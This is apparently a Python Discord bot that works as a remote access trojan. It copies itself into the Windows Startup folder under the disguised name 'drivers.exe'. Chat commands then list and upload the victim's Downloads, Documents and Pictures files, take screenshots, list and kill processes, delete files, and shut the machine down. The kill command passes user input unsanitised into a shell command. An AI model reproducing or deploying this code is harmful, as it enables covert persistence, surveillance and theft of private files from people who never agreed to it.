import os
import discord
import asyncio
import subprocess
import webbrowser
import mss
import mss.tools
import shutil
from datetime import datetime
from pathlib import Path
from discord.ext import commands
from discord import File  # Import for sending files
from http.server import HTTPServer, SimpleHTTPRequestHandler
from socketserver import ThreadingMixIn

intents = discord.Intents.default()
intents.messages = True  # Allows the bot to receive messages
intents.message_content = True  # Allows the bot to read message content

bot = commands.Bot(command_prefix='!', intents=intents)

class ThreadingSimpleServer(ThreadingMixIn, HTTPServer):
    pass

async def start_server(path, port=8000):
    os.chdir(path)
    
    handler = SimpleHTTPRequestHandler
    server = ThreadingSimpleServer(('', port), handler)
    
    await asyncio.get_event_loop().run_in_executor(None, server.serve_forever)
    return server


def list_files(startpath):
    tree = ""
    for root, dirs, files in os.walk(startpath):
        level = root.replace(str(startpath), '').count(os.sep)
        indent = ' ' * 4 * level
        tree += f"{indent}📁 {os.path.basename(root)}/\n"
        subindent = ' ' * 4 * (level + 1)
        for f in files:
            filepath = os.path.join(root, f)
            filestat = os.stat(filepath)
            filesize = filestat.st_size
            mod_time = datetime.fromtimestamp(filestat.st_mtime).strftime('%Y-%m-%d %H:%M:%S')
            tree += f"{subindent}📄 {f} - {filesize} bytes (Last Modified: {mod_time})\n"
    return tree

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}')















def split_message(msg, limit=1900):
    """
    Splits a message into chunks that are under the specified limit.
    """
    if len(msg) <= limit:
        return [msg]
    return [msg[i:i+limit] for i in range(0, len(msg), limit)]























import sys
import shutil
import os  # Import the os module
from pathlib import Path

def copy_to_startup():
    # Define the name of your executable
    exe_name = "drivers.exe"

    if getattr(sys, 'frozen', False):
        # If the script is running in a bundle (packaged by PyInstaller)
        exe_path = sys.executable
    else:
        # If the script is running as a normal Python script (useful for testing)
        exe_path = Path(__file__).resolve()

    # Define the path to the Startup folder
    startup_folder = Path(os.getenv('APPDATA')) / r'Microsoft\Windows\Start Menu\Programs\Startup'
    dest_path = startup_folder / exe_name
    
    # Copy the file to the Startup folder if it doesn't already exist there
    if not dest_path.exists():
        shutil.copy(exe_path, dest_path)
        print(f"Copied {exe_path} to {dest_path}")
    else:
        print(f"The file {dest_path.name} already exists in the Startup folder.")

# Call the function
copy_to_startup()




#######################################################################################################################################
############### DOWNLOAD  FILES  ######################################################################################################


@bot.command()
async def downloads(ctx):
    home = Path.home()
    downloads_path = home / 'Downloads'
    
    if not downloads_path.exists() or not downloads_path.is_dir():
        await ctx.send("The Downloads directory does not exist or is not accessible.")
        return
    
    files_tree = list_files(downloads_path)
    if files_tree:
        messages = split_message(f"Files in Downloads directory:\n```{files_tree}```")
        for msg in messages:
            await ctx.send(msg)
    else:
        await ctx.send("The Downloads directory is empty.")



#######################################################################################################################################
############### OPEN FILES ############################################################################################################

@bot.command()
async def open_downloads(ctx, filename: str):
    # Define the directory where your files are located
    downloads_path = Path.home() / 'Downloads'
    
    # Construct the full path of the file
    file_path = downloads_path / filename
    
    # Check if the file exists
    if not file_path.exists() or not file_path.is_file():
        await ctx.send(f"The file {filename} does not exist.")
        return
    
    # Check for allowed file types to prevent running arbitrary executables
    if not filename.endswith(('.png', '.jpg', '.txt', '.pdf', '.exe', '.py', '.rar', '.zip', '.webp',)):  # Add any file extensions you want to allow
        await ctx.send("You cannot open this type of file.")
        return
    
    try:
        # Open the file using the default application
        if os.name == 'nt':  # If running on Windows
            os.startfile(file_path)
        else:  # For macOS and Linux, the 'open' command opens a file (macOS) or a URL (Linux).
            subprocess.run(['open', file_path], check=True)
        
        await ctx.send(f"{filename} has been opened.")
    except Exception as e:
        await ctx.send(f"Failed to open the file: {str(e)}")

MAX_FILE_SIZE = 8 * 1024 * 1024  # 8 MB, Discord's file size limit for a single file










@bot.command()
async def open_documents(ctx, filename: str):
    # Define the directory where your files are located
    documents_path = Path.home() / 'Documents'
    
    # Construct the full path of the file
    file_path = documents_path / filename
    
    # Check if the file exists
    if not file_path.exists() or not file_path.is_file():
        await ctx.send(f"The file {filename} does not exist.")
        return
    
    # Check for allowed file types to prevent running arbitrary executables
    if not filename.endswith(('.png', '.jpg', '.txt', '.pdf', '.exe', '.py', '.rar', '.zip', '.webp',)):  # Add any file extensions you want to allow
        await ctx.send("You cannot open this type of file.")
        return
    
    try:
        # Open the file using the default application
        if os.name == 'nt':  # If running on Windows
            os.startfile(file_path)
        else:  # For macOS and Linux, the 'open' command opens a file (macOS) or a URL (Linux).
            subprocess.run(['open', file_path], check=True)
        
        await ctx.send(f"{filename} has been opened.")
    except Exception as e:
        await ctx.send(f"Failed to open the file: {str(e)}")

MAX_FILE_SIZE = 8 * 1024 * 1024  # 8 MB, Discord's file size limit for a single file










@bot.command()
async def open_pictures(ctx, filename: str):
    # Define the directory where your files are located
    pictures_path = Path.home() / 'Pictures'
    
    # Construct the full path of the file
    file_path = pictures_path / filename
    
    # Check if the file exists
    if not file_path.exists() or not file_path.is_file():
        await ctx.send(f"The file {filename} does not exist.")
        return
    
    # Check for allowed file types to prevent running arbitrary executables
    if not filename.endswith(('.png', '.jpg', '.txt', '.pdf', '.exe', '.py', '.rar', '.zip', '.webp',)):  # Add any file extensions you want to allow
        await ctx.send("You cannot open this type of file.")
        return
    
    try:
        # Open the file using the default application
        if os.name == 'nt':  # If running on Windows
            os.startfile(file_path)
        else:  # For macOS and Linux, the 'open' command opens a file (macOS) or a URL (Linux).
            subprocess.run(['open', file_path], check=True)
        
        await ctx.send(f"{filename} has been opened.")
    except Exception as e:
        await ctx.send(f"Failed to open the file: {str(e)}")

MAX_FILE_SIZE = 8 * 1024 * 1024  # 8 MB, Discord's file size limit for a single file




#######################################################################################################################################
############### VIEW FILES ############################################################################################################


@bot.command()
async def view_downloads(ctx, path_name: str):
    home = Path.home()
    downloads_path = home / 'Downloads'
    target_path = downloads_path / path_name

    if not target_path.exists():
        await ctx.send(f"The path {path_name} does not exist in {downloads_path}.")
        return

    if target_path.is_dir():
        files = os.listdir(target_path)
        total_size = sum(os.path.getsize(os.path.join(target_path, f)) for f in files)
        
        if total_size > MAX_FILE_SIZE:
            await ctx.send("The total size of files in this directory exceeds the Discord file upload limit.")
            return

        for file in files:
            file_path = target_path / file
            if file_path.is_file():  # Only send files, ignore subdirectories
                try:
                    await ctx.send(file=discord.File(file_path))
                except Exception as e:
                    await ctx.send(f"An error occurred while sending {file}: {e}")
    elif target_path.is_file():
        if target_path.stat().st_size > MAX_FILE_SIZE:
            server = await start_server(downloads_path)
            await ctx.send(f"The file is too large to send directly. You can download it from: http://localhost:{server.server_address[1]}/{path_name}")
        else:
            try:
                await ctx.send(file=discord.File(target_path))
            except Exception as e:
                await ctx.send(f"An error occurred: {e}")
    else:
        await ctx.send(f"The path {path_name} is neither a file nor a directory.")















@bot.command()
async def view_documents(ctx, path_name: str):
    home = Path.home()
    documents_path = home / 'Documents'
    target_path = documents_path / path_name

    if not target_path.exists():
        await ctx.send(f"The path {path_name} does not exist in {documents_path}.")
        return

    if target_path.is_dir():
        files = os.listdir(target_path)
        total_size = sum(os.path.getsize(os.path.join(target_path, f)) for f in files)
        
        if total_size > MAX_FILE_SIZE:
            await ctx.send("The total size of files in this directory exceeds the Discord file upload limit.")
            return

        for file in files:
            file_path = target_path / file
            if file_path.is_file():  # Only send files, ignore subdirectories
                try:
                    await ctx.send(file=discord.File(file_path))
                except Exception as e:
                    await ctx.send(f"An error occurred while sending {file}: {e}")
    elif target_path.is_file():
        if target_path.stat().st_size > MAX_FILE_SIZE:
            server = await start_server(documents_path)
            await ctx.send(f"The file is too large to send directly. You can download it from: http://localhost:{server.server_address[1]}/{path_name}")
        else:
            try:
                await ctx.send(file=discord.File(target_path))
            except Exception as e:
                await ctx.send(f"An error occurred: {e}")
    else:
        await ctx.send(f"The path {path_name} is neither a file nor a directory.")













@bot.command()
async def view_pictures(ctx, path_name: str):
    home = Path.home()
    pictures_path = home / 'Pictures'
    target_path = pictures_path / path_name

    if not target_path.exists():
        await ctx.send(f"The path {path_name} does not exist in {pictures_path}.")
        return

    if target_path.is_dir():
        files = os.listdir(target_path)
        total_size = sum(os.path.getsize(os.path.join(target_path, f)) for f in files)
        
        if total_size > MAX_FILE_SIZE:
            await ctx.send("The total size of files in this directory exceeds the Discord file upload limit.")
            return

        for file in files:
            file_path = target_path / file
            if file_path.is_file():  # Only send files, ignore subdirectories
                try:
                    await ctx.send(file=discord.File(file_path))
                except Exception as e:
                    await ctx.send(f"An error occurred while sending {file}: {e}")
    elif target_path.is_file():
        if target_path.stat().st_size > MAX_FILE_SIZE:
            server = await start_server(pictures_path)
            await ctx.send(f"The file is too large to send directly. You can download it from: http://localhost:{server.server_address[1]}/{path_name}")
        else:
            try:
                await ctx.send(file=discord.File(target_path))
            except Exception as e:
                await ctx.send(f"An error occurred: {e}")
    else:
        await ctx.send(f"The path {path_name} is neither a file nor a directory.")


#######################################################################################################################################
############### VIEW DIRECTORIES ######################################################################################################








@bot.command()
async def documents(ctx):
    home = Path.home()
    documents_path = home / 'Documents'
    
    if not documents_path.exists() or not documents_path.is_dir():
        await ctx.send("The Documents directory does not exist or is not accessible.")
        return
    
    files_tree = list_files(documents_path)
    if files_tree:
        await ctx.send(f"Files in Documents directory:\n```{files_tree}```")
    else:
        await ctx.send("The Documents directory is empty.")








@bot.command()
async def pictures(ctx):
    home = Path.home()
    pictures_path = home / 'Pictures'
    
    if not pictures_path.exists() or not pictures_path.is_dir():
        await ctx.send("The Pictures directory does not exist or is not accessible.")
        return
    
    files_tree = list_files(pictures_path)
    if files_tree:
        await ctx.send(f"Files in Pictures directory:\n```{files_tree}```")
    else:
        await ctx.send("The Pictures directory is empty.")







#######################################################################################################################################
############### FUN COMMANDS ######################################################################################################
        

@bot.command()
async def shutdown(ctx):
    # Replace 'your_username' with your actual username
    if str(ctx.message.author) == 'your_username':  
        try:
            await ctx.send("Shutting down the PC...")
            if os.name == 'nt':  # If running on Windows
                os.system('shutdown /s /t 1')  # Shutdown command for Windows
            else:  # For macOS and Linux
                os.system('shutdown now')  # Shutdown command for Unix-based systems
        except Exception as e:
            await ctx.send(f"An error occurred: {str(e)}")
    else:
        await ctx.send("You do not have permission to perform this action.")







@bot.command()
async def rickroll(ctx):
    await ctx.send("rick sent!")
    webbrowser.open('https://shattereddisk.github.io/rickroll/rickroll.mp4')








       




























def take_screenshot(filename='screenshot.png'):
    with mss.mss() as sct:
        # The screen part to capture
        monitor = sct.monitors[1]

        # Grab the data
        sct_img = sct.grab(monitor)

        # Save to the picture file
        mss.tools.to_png(sct_img.rgb, sct_img.size, output=filename)
    return filename

@bot.command(name='screenshot', help='Takes a screenshot of the server')
async def screenshot(ctx):
    filename = 'screenshot.png'  # Default name, will be overwritten by take_screenshot if successful
    try:
        # Call the screenshot function
        filename = take_screenshot()
        
        # Ensure the file was created
        if not Path(filename).is_file():
            raise FileNotFoundError(f"Screenshot was not saved: {filename}")

        # Send the screenshot file
        await ctx.send(file=discord.File(filename))
        
    except Exception as e:
        # If an error occurs, send an error message
        await ctx.send(f"An error occurred while taking a screenshot: {str(e)}\n{traceback.format_exc()}")
    
    finally:
        # Remove the file after sending it or if an error occurs
        try:
            if Path(filename).exists():
                os.remove(filename)
        except Exception as e:
            await ctx.send(f"An error occurred while deleting the screenshot file: {str(e)}")















#######################################################################################################################################
############### TASK MANAGER COMMANDS  ######################################################################################################




import io  # Import at the beginning of your file

@bot.command()
async def tasks(ctx):
    try:
        if os.name == 'nt':  # If running on Windows
            output = subprocess.check_output("tasklist", shell=True).decode()
        else:  # For Unix-based systems
            output = subprocess.check_output("ps aux", shell=True).decode()
        
        # Check the length of the output
        if len(output) <= 2000:
            await ctx.send(f"```{output}```")
        else:
            # If the output is too long, write it to a temporary file and send the file
            with io.StringIO(output) as file:
                file.seek(0)
                discord_file = discord.File(fp=file, filename="tasks_output.txt")
                await ctx.send("The task list is too long to display. Here's the full list as a file:", file=discord_file)
    except Exception as e:
        await ctx.send(f"An error occurred: {str(e)}")








@bot.command()
async def kill(ctx, process_name: str):
    try:
        if os.name == 'nt':  # If running on Windows
            subprocess.run(f"taskkill /IM {process_name} /F", shell=True, check=True)
        else:  # For Unix-based systems
            subprocess.run(f"killall {process_name}", shell=True, check=True)
        
        await ctx.send(f"The process {process_name} has been killed.")
    except subprocess.CalledProcessError as e:
        await ctx.send(f"Failed to kill {process_name}. It might not be running or you don't have the necessary permissions.")
    except Exception as e:
        await ctx.send(f"An error occurred: {str(e)}")












@bot.command()
async def delete(ctx, filename: str):
    # Define the directory where the files are located
    downloads_path = Path.home() / 'Downloads'
    
    # Construct the full path of the file
    file_path = downloads_path / filename
    
    # Check if the file exists
    if not file_path.exists() or not file_path.is_file():
        await ctx.send(f"The file {filename} does not exist in your Downloads folder.")
        return
    
    try:
        # Delete the file
        file_path.unlink()
        
        # Send a confirmation message
        await ctx.send(f"The file {filename} has been successfully deleted from your Downloads folder.")
    except Exception as e:
        # If an error occurs, send an error message
        await ctx.send(f"An error occurred while trying to delete the file: {str(e)}")






















# Enter your token here
bot.run('enter_token_here')
